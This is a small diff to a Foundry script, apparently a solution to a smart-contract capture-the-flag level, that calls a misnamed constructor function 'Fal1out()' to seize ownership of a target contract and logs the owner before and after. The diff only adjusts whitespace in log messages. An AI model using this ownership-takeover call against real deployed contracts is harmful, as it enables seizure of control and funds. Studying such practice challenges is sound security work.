@@ -10,11 +10,11 @@ contract AttackerFalloutScript is Script {
     function run() external {
         vm.startBroadcast();
 
-        console.log("Current Owner is: ", fallout.owner());
+        console.log("Current Owner is : ", fallout.owner());
 
         fallout.Fal1out();
 
-        console.log("New Owner is: ", fallout.owner());
+        console.log("New Owner is : ", fallout.owner());
 
         vm.stopBroadcast();
     }
